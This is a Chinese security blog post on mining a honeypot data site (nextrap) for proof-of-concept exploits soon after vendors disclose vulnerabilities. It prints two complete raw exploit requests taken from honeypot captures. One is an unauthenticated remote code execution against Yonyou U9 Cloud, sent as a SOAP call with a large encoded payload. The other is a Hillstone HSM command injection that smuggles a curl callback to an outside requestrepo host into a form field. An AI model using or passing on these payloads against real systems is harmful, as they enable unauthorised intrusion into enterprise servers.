#  如何避免被割韭菜之快速获取0day漏洞详情  
原创 弱鸡  角宿安全   2026-01-07 04:00  
  
参考：  
https://ruoji6.github.io/posts/16615.html  
  
安全厂商对漏洞进行披露的时候一般会披露出漏洞的产品的名称以及漏洞复现截图，此时我们可以借助  
nextrap  
网站搜索蜜罐捕捉到的POC。  
  
nextrap地址：  
https://www.nextrap.net/  
  
# 0.1 nextrap搜索技巧  
  
nextrap官网描述：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYLp3mxSRM2hI6D2c1s9GiccF7cArVsCI9OMpYeqnwJDJcaicVp9J7lGEVQ/640?wx_fmt=png&from=appmsg "")  
  
其中我们可以通过特定的语法检索POC：  
  
## 0.1.1 实战搜索 用友U9 Cloud 命令执行  
  
漏洞描述  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYL44m531EY8sicX2L9hoj8EoELMw1uHZJl6vKXYg82FCaTqVBQG8qYkcA/640?wx_fmt=png&from=appmsg "")  
  
最新披露的用友U9 Cloud 未授权远程代码执行漏洞，首先我们需要获取准确的产品名称：  
  
（用友U9 Cloud ）全称：U9-用友-智能网关-智能工厂  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYL64A4Co13dGzDFzw0tEVmZ9zZ9gicZdhefCFmxMu4MUOouMTvIHAzjKg/640?wx_fmt=png&from=appmsg "")  
  
使用测绘语法搜索产品：  
```
```  
  
次语法解释：  
  
product  
 产品名  
  
url  
 url路径（其中  
*  
为通配符）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYL8FnRVgf3ibvObgeAib07F2oq4HVElwEszXxyt2TEhpJK9eZoLib7EwAkA/640?wx_fmt=png&from=appmsg "")  
  
此时我们可以通过检索信息找寻POC（如下图所示，就是最新的U9 命令执行POC）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYLdgia1X0ygro6eH3vJTcBg9acPiacE9mtaT2iaFeOGdWhYscPVKj9wPO4A/640?wx_fmt=png&from=appmsg "")  
```
POST /U9C/CS/Office/OfficeReportCommonService.asmx HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 4573
Content-Type: text/xml; charset=utf-8
Soap-Date: 23449262
Soapaction: "http://tempuri.org/ReleaseReport"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/[REDACTED] Safari/537.36

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ReleaseReport xmlns="http://tempuri.org/">
      <context>string</context>
   <excelReportSolution>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</excelReportSolution>
    </ReleaseReport>
  </soap:Body>
</soap:Envelope>
```  
  
## 0.1.2 实战搜索 山石网科安全管理平台HSM 命令执行漏洞  
  
漏洞信息：NCC-2025-00663  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYLKgpxICkpJh6cHHNhCkI32iaNtdL9hrpqXxicPs0F8yJXFeKIOJJTXhaA/640?wx_fmt=png&from=appmsg "")  
  
此时我们先定位产品：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYLl36TXicPPenaUCdLzyfPkRdsic2ZGNWKRLFj0Jqe8oBPYC50UCBV6N1A/640?wx_fmt=png&from=appmsg "")  
  
在产品的下面会提示部分命令执行漏洞的路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYL3lo73ztrtoukVGiciaicicBY9aP7oicEatnYH2omttJ380WT9cwJ3KhdmGw/640?wx_fmt=png&from=appmsg "")  
  
然后使用测绘语法  
```
```  
  
product  
 产品名  
  
url  
 url路径（其中  
*  
为通配符）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYLbPqG0nRqlSlpMdkda6kYSCKLjwKZ7to3iaQOhib7MicckXm8yffibcPlyA/640?wx_fmt=png&from=appmsg "")  
  
此时我们发现POC是关键信息是加*的，此时我们可以继续翻页查找，就可以找到关键POC。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TMwBibc8FlgZicOIToIqPATa030UqAKYYLpNyPEYcjHMBAvtmpDZNKmVyGqmHibQFVkOfAABDZcWynnA0TwYaVNgQ/640?wx_fmt=png&from=appmsg "")  
  
```
POST /rest/common/licenseService/applyLicense HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 188
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36

parameter={"License":{"consumer":"1","address":"1","zipCode":"1;curl http://utmlq3ul.requestrepo.com/126;","contactor":"1","telphone":"1","email":"hillstone@hillstone.com","enabled":true}}
```  
  
  
